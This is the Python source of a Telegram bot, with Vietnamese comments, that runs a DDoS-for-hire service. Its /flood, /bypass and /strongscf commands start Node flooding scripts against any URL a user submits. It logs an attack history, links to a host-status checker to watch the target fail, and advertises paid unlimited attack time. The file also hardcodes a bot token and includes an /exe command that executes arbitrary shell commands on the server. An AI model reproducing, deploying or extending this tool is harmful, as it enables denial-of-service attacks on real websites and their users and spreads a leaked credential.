import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime, timedelta  # Thêm timedelta vào đây
import json
import time
import pytz

ALLOWED_USER_ID = 7371969470  # ID của admin mặc định
TOKEN = '7918986015:AAG1XUBnLpc1TJrdHWoT1ph2meDeQt2zbPY'   # Token của bot Telegram
GROUPS_FILE, HISTORY_FILE, ADMINS_FILE = "allowed_groups.json", "attack_history.json", "admins.json"
task_info = {}  # Thông tin tiến trình tấn công
bot_status = True  # Trạng thái của bot, mặc định là bật

# Load và lưu dữ liệu JSON
def load_json(file, default_value=None):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default_value if default_value else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

# Kiểm tra nếu người dùng là admin
def is_admin(user_id):
    admins = load_json(ADMINS_FILE, [])
    return user_id == ALLOWED_USER_ID or user_id in admins

# Kiểm tra trạng thái của bot
def is_bot_on():
    return bot_status


# Lệnh tấn công
async def run_attack(url, attack_time, update, method, context):
    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
    
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"
    commands = {
        'STRONGS-CF': f"node {heap_size} strongsflood.js {url} {attack_time} 10 10 live.txt",
        'bypass': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt bypass",
        'flood': f"node {heap_size} tls-kill.js {url} {attack_time} 20 20 live.txt flood"
    }

    command = commands.get(method)
    if not command:
        return await update.message.reply_text("❌ Phương thức không hợp lệ.")

    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    task_info.setdefault(user_id, []).append({
        "url": url, "method": method, "remaining_time": attack_time,
        "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
        "message": None
    })

    # Lưu lịch sử tấn công
    history = load_json(HISTORY_FILE)
    history.append({"user_id": user_id, "username": update.effective_user.username, "url": url, "method": method, "attack_time": attack_time, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")})
    save_json(HISTORY_FILE, history)

    # Thông báo ngay lập tức vào nhóm
    group_chat_id = update.message.chat.id
    attack_result = f"🚨 ATTACK {url} đã bắt đầu.\nPhương thức: {method}\nThời gian: {attack_time} giây\n\n💬 Người dùng @{update.effective_user.username} 💥 Kiểm tra tin nhắn đến từ bot để theo dõi kết quả chi tiết 📝."
    await context.bot.send_message(group_chat_id, attack_result)

    async def update_remaining_time():
        start_time = time.time()
        end_time = start_time + attack_time
        while time.time() < end_time:
            remaining_time = max(0, int(end_time - time.time()))
            task_text = f"🔴 Tiến trình:\nURL: {url}, Phương thức: {method}\n⏳ Thời gian còn lại: {remaining_time} giây\n\n🔗 Kiểm tra tình trạng HOST: [Click here](https://check-host.net/check-http?host=https://{parse.urlsplit(url).netloc})"

            # Gửi thông báo riêng cho người dùng mỗi 5 giây
            if user_id in task_info and task_info[user_id]:
                # Nếu đã có tin nhắn trước đó, xóa nó đi
                if task_info[user_id][0]["message"]:
                    try:
                        # Xóa tin nhắn cũ trước khi gửi tin nhắn mới
                        await task_info[user_id][0]["message"].delete()
                    except Exception as e:
                        print(f"Error deleting message: {e}")  # Handle any errors that might occur while deleting a message

                # Gửi tin nhắn mới
                task_info[user_id][0]["message"] = await update.effective_user.send_message(task_text, parse_mode='Markdown')

            await asyncio.sleep(5)  # Chờ 5 giây trước khi gửi tin nhắn tiếp theo

    # Tạo tác vụ cập nhật thời gian còn lại
    asyncio.create_task(update_remaining_time())
    await asyncio.sleep(attack_time)

    # Thông báo kết thúc tấn công cho người dùng
    await update.effective_user.send_message(f"Attack {method} URL {url} Successfully. ✅")

# Lưu trữ thời gian cuối cùng người dùng thực hiện lệnh
user_last_command_time = {}

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Kiểm tra trạng thái bot
    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
    
    # Kiểm tra quyền của người dùng
    if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(user_id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng tính năng này. Muốn build server bot riêng hoặc mở không giới hạn slot time, liên hệ @NeganSSHConsole.")

    # Kiểm tra thời gian giữa các lần thực thi lệnh, chỉ áp dụng cho người không phải admin
    if not is_admin(user_id):  # Nếu người dùng không phải admin
        current_time = time.time()  # Thời gian hiện tại (tính bằng giây)
        last_time = user_last_command_time.get(user_id, 0)  # Thời gian thực hiện lệnh cuối cùng của người dùng

        if current_time - last_time < 60:
            remaining_time = 60 - (current_time - last_time)
            # Gửi tin nhắn riêng cho người yêu cầu về thời gian chờ
            return await update.message.reply_text(f"❌ @{update.effective_user.username}, bạn cần chờ thêm {int(remaining_time)} giây nữa mới có thể thực hiện lệnh tiếp theo.")

        # Lưu lại thời gian thực hiện lệnh hiện tại (người dùng có thể thực hiện lệnh)
        user_last_command_time[user_id] = current_time

    # Kiểm tra cú pháp lệnh
    if len(context.args) < 2:
        return await help_command(update, context)

    try:
        url, attack_time = context.args[0], int(context.args[1])
        method = 'STRONGS-CF' if '/strongscf' in update.message.text else ('bypass' if '/bypass' in update.message.text else 'flood')

        # Kiểm tra thời gian tấn công
        if attack_time > 60 and not is_admin(update.effective_user.id):
            return await update.message.reply_text("⚠️ Thời gian tối đa là 60 giây.")
        
        # Thực hiện tấn công
        asyncio.create_task(run_attack(url, attack_time, update, method, context))

    except (IndexError, ValueError):
        await update.message.reply_text("❌ Đã xảy ra lỗi.")


# Lịch sử tấn công
async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    history = load_json(HISTORY_FILE)
    current_time = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh"))
    time_limit = current_time - timedelta(minutes=60)  # Thời gian giới hạn: 60 phút trước

    # Lọc ra các bản ghi trong vòng 60 phút qua
    filtered_history = [
        entry for entry in history 
        if datetime.strptime(entry['start_time'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=pytz.timezone("Asia/Ho_Chi_Minh")) >= time_limit
    ]
    
    if not filtered_history:
        return await update.message.reply_text("❌ Không có lịch sử tấn công trong 60 phút qua.")

    # Tạo nội dung lịch sử
    history_text = "📝 Lịch sử trong 60 phút qua:\n"
    for entry in filtered_history:
        history_text += f"💥 URL: {entry['url']}\n⚔ Phương thức: {entry['method']}\n👤 Người dùng: @{entry['username']}\n⏱ Thời gian: {entry['start_time']}\n⏳ Thời gian: {entry['attack_time']} giây\n\n"
    
    # Chia nhỏ tin nhắn nếu nó quá dài
    max_message_length = 4096
    while len(history_text) > max_message_length:
        # Cắt tin nhắn thành các phần nhỏ
        await update.message.reply_text(history_text[:max_message_length], parse_mode='Markdown')
        history_text = history_text[max_message_length:]
    
    # Gửi phần còn lại nếu có
    if history_text:
        await update.message.reply_text(history_text, parse_mode='Markdown')



# Dừng tiến trình tấn công
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    subprocess.run("ps aux | grep 'tls-kill.js\\|strongsflood.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    await update.message.reply_text("✅ Tiến trình tls-kill.js : strongsflood.js đã dừng.")

# Thêm nhóm vào danh sách nhóm được phép
async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        group_id = int(context.args[0])
        allowed_groups = load_json(GROUPS_FILE)
        if group_id in allowed_groups:
            return await update.message.reply_text("❌ Nhóm này đã có trong danh sách.")
        
        allowed_groups.append(group_id)
        save_json(GROUPS_FILE, allowed_groups)
        await update.message.reply_text(f"✅ Nhóm {group_id} đã được thêm vào danh sách nhóm được phép.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID nhóm hợp lệ.")

# Thêm người dùng admin vào danh sách
async def add_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        new_admin_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if new_admin_id in admins:
            return await update.message.reply_text("❌ Người dùng này đã là admin.")
        
        admins.append(new_admin_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {new_admin_id} đã được thêm vào danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

# Xóa người dùng admin
async def delete_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        user_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if user_id not in admins:
            return await update.message.reply_text("❌ Người dùng này không phải là admin.")
        
        admins.remove(user_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {user_id} đã được xóa khỏi danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

# Xóa toàn bộ lịch sử tấn công
async def delete_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    save_json(HISTORY_FILE, [])
    await update.message.reply_text("✅ Toàn bộ lịch sử  đã được xóa.")

# Lệnh bật bot
async def on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = True
    await update.message.reply_text("✅ Bot đã được bật.")

# Lệnh tắt bot
async def off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = False
    await update.message.reply_text("❌ Bot đã bị tắt.")


# Hàm xử lý lệnh /exe
async def exe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Kiểm tra xem người dùng có phải là admin mặc định ALLOWED_USER_ID không
    if update.effective_user.id != ALLOWED_USER_ID:
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")  # Chỉ admin ALLOWED_USER_ID mới được phép sử dụng lệnh

    # Kiểm tra cú pháp lệnh: phải có ít nhất một tham số (lệnh terminal)
    if len(context.args) < 1:
        return await update.message.reply_text("❌ Vui lòng cung cấp lệnh terminal cần thực thi.")  # Nếu thiếu tham số, thông báo lỗi
    
    command = " ".join(context.args)  # Kết hợp các tham số thành một lệnh

    try:
        # Thực thi lệnh terminal và lấy kết quả
        result = subprocess.run(command, shell=True, text=True, capture_output=True)  # Thực thi lệnh, bắt kết quả đầu ra
        
        # Gửi kết quả cho người dùng
        output = result.stdout if result.stdout else "Lệnh thực thi thành công nhưng không có kết quả."  # Nếu có kết quả, gửi nó, nếu không thì thông báo thành công
        await update.message.reply_text(f"⚙️ Kết quả lệnh:\n```\n{output}\n```", parse_mode='Markdown')  # Gửi kết quả dưới dạng markdown

    except Exception as e:
        await update.message.reply_text(f"❌ Đã xảy ra lỗi: {str(e)}")  # Nếu có lỗi, gửi thông báo lỗi


    

# Lệnh giúp đỡ
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🌐 Bot Commands:

### User Commands:
- ✅ /flood https://google.com 60 - Flood attack for 60 seconds.
- ✅ /bypass https://google.com 60 - Bypass attack for 60 seconds.
- ❌ /strongscf https://google.com 60 - STRONGS-CF attack for 60 seconds.
- /help - Show command guide.

### Admin Commands:
- /stop - Stop the attack.
- /addgroup [group_id] - Add group.
- /history - View attack history.
- /adduser [user_id] - Add admin.
- /deleteuser [user_id] - Remove admin.
- /deletehistory - Delete attack history.
- /exe [command] - Execute terminal command.
- /on - Activate bot.
- /off - Deactivate bot.
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')


# Khởi chạy bot
def main():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("strongscf", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("adduser", add_user_admin))
    application.add_handler(CommandHandler("deleteuser", delete_user_admin))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("history", history))
    application.add_handler(CommandHandler("deletehistory", delete_history))
    application.add_handler(CommandHandler("on", on))
    application.add_handler(CommandHandler("off", off))
    application.add_handler(CommandHandler("exe", exe_command))
    application.run_polling()

if __name__ == "__main__":
    main()
